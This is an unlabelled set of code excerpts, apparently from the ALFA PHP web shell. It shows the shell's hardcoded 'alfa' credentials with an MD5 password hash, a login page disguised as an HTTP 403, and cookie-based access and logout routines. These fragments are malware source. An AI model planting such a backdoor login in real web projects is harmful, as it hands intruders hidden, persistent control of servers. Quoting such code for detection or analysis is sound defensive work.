...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'f6c1bbb1efdbf7f8fe57bab821d8782e',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
$config = array('goUser' => $GLOBALS['DB_NAME']['user'],'goPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
if(@$_COOKIE["goUser"] != $config['goUser'] && md5($_COOKIE["goPass"]) != $config['goPass']){
if(@$_POST["usrname"]==$config['goUser'] && @md5($_POST["password"])==$config['goPass']){
__alfa_set_cookie("goUser", $config['goUser']);
__alfa_set_cookie("goPass", $_POST["password"]);
...
if(@md5($_COOKIE["goPass"]) != $config['goPass']){
if(@md5($_POST["password"])==$config['goPass']){
__alfa_set_cookie("goUser", $config['goUser']);
__alfa_set_cookie("goPass", $_POST["password"]);
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
function alfalogout(){
@setcookie("goUser", null, 2012);
@setcookie("goPass", null, 2012);
unset($_COOKIE['goUser'],$_COOKIE['goPass']);
echo("ok");
}
...
echo __pre()."<center><p><div class=\"txtfont\"><
